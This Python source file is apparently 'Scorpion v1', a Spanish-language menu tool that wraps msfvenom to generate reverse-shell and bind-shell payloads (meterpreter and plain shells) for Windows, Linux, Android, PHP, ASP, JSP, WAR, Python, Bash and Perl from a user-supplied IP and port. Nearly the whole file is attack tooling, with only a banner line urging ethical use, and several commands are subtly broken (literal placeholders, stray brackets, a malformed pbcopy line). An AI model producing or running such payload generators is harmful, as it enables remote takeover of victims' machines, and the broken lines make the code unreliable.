# importamos las librerías
import os, time, sys, socket
from colorama import Fore, Back

# configuramos las variables principales
name = socket.gethostname()
ipv4 = socket.gethostbyname(name)
contador = 0

# ponemos a punto los colores
BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
RESET = '\033[39m'

# HACER EL INSTALADOR EN EL MISMO PROGRAMA DE PYTHON QUE INCLUYA INSTALAR MSFVENOM

# hacemos el menú
def menu():
    os.system('clear')
    time.sleep(1)

    title = f'''
                 ......                                         
               .+*+:.             [ 🅢 🅒 🅞 🅡 🅟 🅘 🅞 🅝 ] -----------------------------                         
              .-##.                                           
             .*#*.                [!] By 3xpl017: https://www.github.com/3xpl017                   
            .+%*..                [>] Scorpion v1: Payload generator with MsfVenom
            :#*-.                                            
            -##=                  [!] Utiliza este software con propósitos éticos                       
            :%#=.                 [>] Ip: {ipv4}
            .*@%.                 [>] Nombre de la máquina: {name}                   
            .#%%:     =+=..                                 
            .:=*#**#=--:. ..+.-:+**=.                           
        -=:-:.-#***++===:.--.=+=*+-.                         
        .=. .:+##%*##**++++==-.**-.-++:.                      
    .:==. :*+=..+%#######*=====+-*=--+=.:---:...             
    ....  .+=. :*###%#**#@@%#*#@#+#:.++***+@#+===-.           
        ..*: :*...-**%%%%@%%@%%%@%##%#+:...-+#*++=..         
        .=-...=+. .=++*++***#%%@%===:..    ....=+*#-.         
            .-=.  :++====+*+==:......         :***-.          
            .... .*%#**###*+-...            .......           
                .#*####%%%%%####*+:.                         
                    .:+###%%@%##%#*=:.                          
                    .........                                
    '''
    print(Fore.RED + Back.RESET + title)

    options = '''
    [00] Salir
    [01] Empezar a generar payloads con MsfVenom
    '''
    print(Fore.BLUE + Back.RESET + options)

    choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ ')

    if choice == '00':
        os.system('clear')
        print(Fore.RESET + Back.RESET)
        sys.exit()

    elif choice == '01':
        os.system('clear')
        time.sleep(1)
        options = '''
    [00] Salir
    [01] Volver al menú
    [02] Ver la lista de payloads disponibles
    [03] Generar payloads para Windows
    [04] Generar payloads para Linux
    [05] Generar payloads para Android
    [06] Generar payloads en diferentes lenguajes
    '''
        print(Fore.BLUE + Back.RESET + options)
        choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ ')

        if choice == '00':
            os.system('clear')
            print(Fore.RESET + Back.RESET)
            sys.exit()

        elif choice == '01':
            os.system('clear')
            choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
            print(Fore.RESET + Back.RESET)
            menu()

        elif choice == '02':
            os.system('clear')
            print(Fore.BLUE + Back.RESET + '[>] Todos los payloads posibles')
            print(Fore.BLUE + Back.RESET + '--------------------------------------------------------------------------------------------------------------')
            os.system('msfvenom -l payloads')
            print(Fore.BLUE + Back.RESET + '--------------------------------------------------------------------------------------------------------------')
            choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
            print(Fore.RESET + Back.RESET)
            menu()

        elif choice == '03':
            os.system('clear')
            options = '''
[00] Salir
[01] Volver al menú
[02] Ver todos los payloads posibles
[03] Generar payloads para windows
'''
            print(Fore.BLUE + Back.RESET + options)

            choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ ')

            if choice == '00':
                os.system('clear')
                print(Fore.RESET + Back.RESET)
                sys.exit()

            elif choice == '01':
                os.system('clear')
                choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
                print(Fore.RESET + Back.RESET)
                menu()

            elif choice == '02':
                os.system('clear')
                print(Fore.BLUE + Back.RESET + '[>] Todos los payloads posibles para Windows')
                print(Fore.BLUE + Back.RESET + '--------------------------------------------------------------------------------------------------------------')
                os.system('msfvenom -l payloads | grep windows')
                print(Fore.BLUE + Back.RESET + '--------------------------------------------------------------------------------------------------------------')
                choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
                print(Fore.RESET + Back.RESET)
                menu()

            elif choice == '03':
                contador = 0
                os.system('clear')
                port = int(input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa el puerto]: '))
                ip = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa tu IP]: ')
                archivo = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa el nombre de tu payload]: ')
                os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > {archivo}_{contador}.exe')
                contador += 1
                os.system(f'msfvenom -p windows/meterpreter/reverse_http LHOST={ip} LPORT={port} HttpUserAgent="Mozilla/5.0 (Windows NT10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > {archivo}_{contador}.exe')
                contador += 1
                os.system(f'msfvenom -p windows/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe > {archivo}_{contador}.exe')
                contador += 1
                os.system(f'msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > {archivo}_{contador}.exe')
                contador = 0
                print('\n[>] Payloads generados en tu directorio actual.')
                choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
                print(Fore.RESET + Back.RESET)
                menu()

            else:
                os.system('clear')
                print(Fore.BLUE + Back.RESET + '\n[>] Error: Command not found')
                choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
                print(Fore.RESET + Back.RESET)
                menu()

        elif choice == '04':
            os.system('clear')
            options = '''
[00] Salir
[01] Volver al menú
[02] Ver todos los payloads posibles
[03] Generar payloads para Linux
'''
            print(Fore.BLUE + Back.RESET + options)

            choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ ')

            if choice == '00':
                os.system('clear')
                print(Fore.RESET + Back.RESET)
                sys.exit()

            elif choice == '01':
                os.system('clear')
                choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
                print(Fore.RESET + Back.RESET)
                menu()

            elif choice == '02':
                os.system('clear')
                print(Fore.BLUE + Back.RESET + '[>] Todos los payloads posibles para Linux')
                print(Fore.BLUE + Back.RESET + '--------------------------------------------------------------------------------------------------------------')
                os.system('msfvenom -l payloads | grep linux')
                print(Fore.BLUE + Back.RESET + '--------------------------------------------------------------------------------------------------------------')
                choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
                print(Fore.RESET + Back.RESET)
                menu()

            elif choice == '03':
                contador = 0
                os.system('clear')
                port = int(input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa el puerto]: '))
                ip = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa tu IP]: ')
                ip_remota = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa la IP remota]: ')
                archivo = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa el nombre de tu payload]: ')
                os.system(f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf > {archivo}_{contador}.elf')
                contador += 1
                os.system(f'msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=[IPRemota] LPORT=[PuertoEscucha] -f elf > shell.elf')
                contador += 1
                os.system(f'msfvenom -p linux/x86/meterpreter/bind_tcp RHOST={ip_remota} LPORT={port} -f elf > {archivo}_{contador}.elf')
                contador += 1
                os.system(f'msfvenom -p linux/x64/shell_bind_tcp RHOST={ip_remota} LPORT={port} -f elf > {archivo}_{contador}.elf')
                contador += 1
                os.system(f'msfvenom -p linux/x64/shell_reverse_tcp RHOST={ip_remota} LPORT={port} -f elf > {archivo}_{contador}.elf')
                contador = 0
                print('\n[>] Payloads generados en tu directorio actual.')
                choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
                print(Fore.RESET + Back.RESET)
                menu()

            else:
                os.system('clear')
                print(Fore.BLUE + Back.RESET + '\n[>] Error: Command not found')
                choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
                print(Fore.RESET + Back.RESET)
                menu()

        elif choice == '05':
            os.system('clear')
            port = int(input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa el puerto]: '))
            ip = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa tu IP]: ')
            archivo = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa el nombre de tu payload]: ')
            os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {archivo}.apk')
            print('\n[>] Payload generador en tu directorio actual')
            choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
            print(Fore.RESET + Back.RESET)
            menu()

        elif choice == '06':
            os.system('clear')
            port = int(input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa el puerto]: '))
            ip = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa tu IP]: ')

            os.system(f'msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell_PHP.php')
            os.system("cat shell.php | pbcopy && echo ' shell.php && pbpaste >> shell.php")

            os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f asp > shell_ASP.asp')
            os.system(f'msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell_JSP.jsp')
            os.system(f'msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war > shell_WAR.war')
            os.system(f'msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw > shell_PY.py')
            os.system(f'msfvenom -p cmd/unix/reverse_bash LHOST={ip}] LPORT={port}] -f raw > shell_SH.sh')
            os.system(f'msfvenom -p cmd/unix/reverse_perl LHOST={ip} LPORT={port} -f raw > shell_PL.pl')

            print('[>] Payloads generador en tu directorio actual')
            choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
            print(Fore.RESET + Back.RESET)
            menu()

        else:
            os.system('clear')
            print(Fore.BLUE + Back.RESET + '\n[>] Error: Command not found')
            choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
            print(Fore.RESET + Back.RESET)
            menu()

    else:
        os.system('clear')
        print(Fore.BLUE + Back.RESET + '\n[>] Error: Command not found')
        choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
        print(Fore.RESET + Back.RESET)
        menu()

menu()
